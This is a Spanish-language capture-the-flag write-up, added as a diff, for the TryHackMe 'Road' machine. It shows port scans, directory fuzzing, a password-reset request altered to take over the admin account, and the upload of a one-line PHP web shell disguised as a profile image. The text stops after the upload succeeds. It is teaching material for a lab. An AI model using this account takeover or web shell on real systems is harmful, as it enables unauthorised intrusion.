@@ -1,0 +1,191 @@
+## TryHackMe  <> Road
+![image](https://github.com/Esevka/CTF/assets/139042999/d30b89d8-4160-4311-a686-1299c32d9edd)
+
+Enunciado Informacion : Obtener user.txt y root.txt
+
+---
+---
+
+## Escaneo de puertos
+
+Lanzamos una traza ICMP(ping) para ver si la maquina esta activa, segun el ttl obtenido, por proximidad al valor 64 podriamos decir que es una maquina Linux.
+  
+    ┌──(root㉿kali)-[/home/kali/Desktop/ctf/road]
+    └─# ping -c1 10.10.121.4
+    PING 10.10.121.4 (10.10.121.4) 56(84) bytes of data.
+    64 bytes from 10.10.121.4: icmp_seq=1 ttl=63 time=561 ms
+    
+    --- 10.10.121.4 ping statistics ---
+    1 packets transmitted, 1 received, 0% packet loss, time 0ms
+    rtt min/avg/max/mdev = 560.987/560.987/560.987/0.000 ms
+    
+Reporte Nmap (Obtenemos puertos abiertos servicios y versiones que estan corriendo.
+
+    ┌──(root㉿kali)-[/home/…/Desktop/ctf/road/nmap]
+    └─# nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.121.4 -oN open_ports                                                    
+    Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-31 19:04 CEST
+    PORT   STATE SERVICE REASON
+    22/tcp open  ssh     syn-ack ttl 63
+    80/tcp open  http    syn-ack ttl 63
+    
+    ┌──(root㉿kali)-[/home/…/Desktop/ctf/road/nmap]
+    └─# nmap -p 22,80 -sCV 10.10.121.4 -vvv -oN info_ports                        
+    Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-31 19:05 CEST
+    PORT   STATE SERVICE REASON         VERSION
+    22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey: 
+    |   3072 e6dc8869dea1738e845ba13e279f0724 (RSA)
+    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXhjztNjrxAn+QfSDb6ugzjCwso/WiGgq/BGXMrbqex9u5Nu1CKWtv7xiQpO84MsC2li6UkIAhWSMO0F//9odK1aRpPbH97e1ogBENN6YBP0s2z27aMwKh5UMyrzo5R42an3r6K+1x8lfrmW8VOOrvR4pZg9Mo+XNR/YU88P3XWq22DNPJqwtB3q4Sw6M/nxxUjd01kcbjwd1d9G+nuDNraYkA2T/OTHfp/xbhet9K6ccFHoi+A8r6aL0GV/qqW2pm4NdfgwKxM73VQzyolkG/+DFkZc+RCH73dYLEfVjMjTbZTA+19Zd2hlPJVtay+vOZr1qJ9ZUDawU7rEJgJ4hHDqlVjxX9Yv9SfFsw+Y0iwBfb9IMmevI3osNG6+2bChAtI2nUJv0g87I31fCbU5+NF8VkaGLz/sZrj5xFvyrjOpRnJW3djQKhk/Avfs2wkZ+GiyxBOZLetSDFvTAARmqaRqW9sjHl7w4w1+pkJ+dkeRsvSQlqw+AFX0MqFxzDF7M=
+    |   256 6bea185d8dc79e9a012cdd50c5f8c805 (ECDSA)
+    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNBLTibnpRB37eKji7C50xC9ujq7UyiFQSHondvOZOF7fZHPDn3L+wgNXEQ0wei6gzQfiZJmjQ5vQ88vEmCZzBI=
+    |   256 ef06d7e4b165156e9462ccddf08a1a24 (ED25519)
+    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPv3g1IqvC7ol2xMww1gHLeYkyUIe8iKtEBXznpO25Ja
+    80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
+    |_http-server-header: Apache/2.4.41 (Ubuntu)
+    |_http-favicon: Unknown favicon MD5: FB0AA7D49532DA9D0006BA5595806138
+    |_http-title: Sky Couriers
+    | http-methods: 
+    |_  Supported Methods: HEAD GET POST OPTIONS
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+## Analisis servicios y vulnerabilidades.
+
+Segun el launchpad del servicio OpenSSH que esta corriento en el puerto 22 y el ttl obtenido anteriormente pordriamos decir que estamos delante de una maquina.
+
+![image](https://github.com/Esevka/CTF/assets/139042999/65cbd52b-a395-4794-80d1-6b7874ca7fd8)
+
+-- Puerto 80
+
+  Cargamos la web y no encontramos nada interesante por lo que vamos a empezar con un poco de fuzzing a ver si encontramos algunos directorios interesantes.
+
+    ┌──(root㉿kali)-[/home/…/Desktop/ctf/road/nmap]
+    └─# gobuster dir -u http://10.10.121.4/ -w /usr/share/wordlists/dirb/common.txt -o ../fuzz
+    ===============================================================
+    Gobuster v3.5
+    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+    ===============================================================
+    /.htaccess            (Status: 403) [Size: 276]
+    /.hta                 (Status: 403) [Size: 276]
+    /.htpasswd            (Status: 403) [Size: 276]
+    /assets               (Status: 301) [Size: 311] [--> http://10.10.121.4/assets/] ---> Nada interesante
+    /index.html           (Status: 200) [Size: 19607]
+    /phpMyAdmin           (Status: 301) [Size: 315] [--> http://10.10.121.4/phpMyAdmin/] ---> No tenemos credenciales 
+    /server-status        (Status: 403) [Size: 276]
+    /v2                   (Status: 301) [Size: 307] [--> http://10.10.121.4/v2/]
+
+  Volvemos a fuzzear el directorio v2 a ver si encontramos algo.
+
+    ┌──(root㉿kali)-[/home/…/Desktop/ctf/road/nmap]
+    └─# gobuster dir -u http://10.10.121.4/v2/ -w /usr/share/wordlists/dirb/common.txt -o ../fuzz1
+    ===============================================================
+    Gobuster v3.5
+    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+    ===============================================================
+    /.hta                 (Status: 403) [Size: 276]
+    /.htaccess            (Status: 403) [Size: 276]
+    /.htpasswd            (Status: 403) [Size: 276]
+    /admin                (Status: 301) [Size: 313] [--> http://10.10.121.4/v2/admin/]
+    /index.php            (Status: 302) [Size: 20178] [--> /v2/admin/login.html]
+
+  Encontramos un directorio (http://10.10.121.4/v2/admin/login.html) en el que podemos hacer login o crear una cuenta en la aplicacion, por lo que vamos a crearnos una cuenta y seguidamente loguearnos en el sistema.
+
+  ![image](https://github.com/Esevka/CTF/assets/139042999/b60ba7ce-4832-4e47-8fe0-639c1889a25a)
+
+  Despues de revisar el entorno al que accedemos al loguearnos en la aplicacion, solo encontramos dos apartados interesantes.
+
+  1) Nos permite cambiar la clave del usuario con el que estamos logueado ---> http://10.10.121.4/v2/ResetUser.php
+  2) Nos permite subir una imagen de nuestro profile, pero solo el admin(admin@sky.thm) tiene permiso ---> http://10.10.121.4/v2/profile.php
+
+![image](https://github.com/Esevka/CTF/assets/139042999/e5d67141-11e6-427a-b6be-144fedd9c6f8)
+
+Analizando los apartados vemos que tras interceptar la request con burpsuite podemos manipular ciertos valores a la hora de cambiar la clave del usuario, ya que no existe token csrf(no controla el usuario autenticado)
+
+	POST /v2/lostpassword.php HTTP/1.1
+	Host: 10.10.121.4
+	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+	Accept-Language: en-US,en;q=0.5
+	Accept-Encoding: gzip, deflate
+	Content-Type: multipart/form-data; boundary=---------------------------227160023612690920091670948221
+	Content-Length: 660
+	Origin: http://10.10.121.4
+	Connection: close
+	Referer: http://10.10.121.4/v2/ResetUser.php
+	Cookie: PHPSESSID=har274pebitf05fieavapumrf2; Bookings=0; Manifest=0; Pickup=0; Delivered=0; Delay=0; CODINR=0; POD=0; cu=0
+	Upgrade-Insecure-Requests: 1
+	
+	-----------------------------227160023612690920091670948221
+	Content-Disposition: form-data; name="uname"
+	
+	esevka@esevka.com
+	-----------------------------227160023612690920091670948221
+	Content-Disposition: form-data; name="npass"
+	
+	esevka
+	-----------------------------227160023612690920091670948221
+	Content-Disposition: form-data; name="cpass"
+	
+	esevka
+	-----------------------------227160023612690920091670948221
+	Content-Disposition: form-data; name="ci_csrf_token"
+ 
+	-----------------------------227160023612690920091670948221
+	Content-Disposition: form-data; name="send"
+	
+	Submit
+	-----------------------------227160023612690920091670948221--
+ 
+ Cambiamos nuestro correo esevka@esevka.com por el correo del admin(admin@sky.thm) y enviamos la request.
+
+	HTTP/1.1 200 OK
+	Date: Mon, 31 Jul 2023 17:52:21 GMT
+	Server: Apache/2.4.41 (Ubuntu)
+	Expires: Thu, 19 Nov 1981 08:52:00 GMT
+	Cache-Control: no-store, no-cache, must-revalidate
+	Pragma: no-cache
+	refresh: 3;url=ResetUser.php
+	Content-Length: 37
+	Connection: close
+	Content-Type: text/html; charset=UTF-8
+	
+	Password changed. 
+	Taking you back...
+
+Como vemos el cambia se ha realizado hacemos un logout y nos logueamos como admin.
+
+![image](https://github.com/Esevka/CTF/assets/139042999/577062b7-c2e0-46f5-92d9-37bf0325b962)
+
+Entramos en el apartado profile donde nos deja subir una imagen para nuestro perfil ya que estamos logueados como el usuario admin(admin@sky.thm), en vez de una imagen subimos un fichero rce.php 
+
+![image](https://github.com/Esevka/CTF/assets/139042999/573182e0-c3b8-4cd5-bdd2-939727395b23)
+
+ Contenido del fichero rce.php
+
+ 	<?php
+  	system($_GET['cmd']);
+  	?>
+
+
+Tras subir el fichero rce.php obtenemos un Response 200 OK 
+
+	HTTP/1.1 200 OK
+	Date: Mon, 31 Jul 2023 18:15:38 GMT
+	Server: Apache/2.4.41 (Ubuntu)
+	Expires: Thu, 19 Nov 1981 08:52:00 GMT
+	Cache-Control: no-store, no-cache, must-revalidate
+	Pragma: no-cache
+	Vary: Accept-Encoding
+	Content-Length: 26802
+	Connection: close
+	Content-Type: text/html; charset=UTF-8
+	
+	Image saved.<!DOCTYPE html>	
+
+
+    
+
+
+  
+
+
+
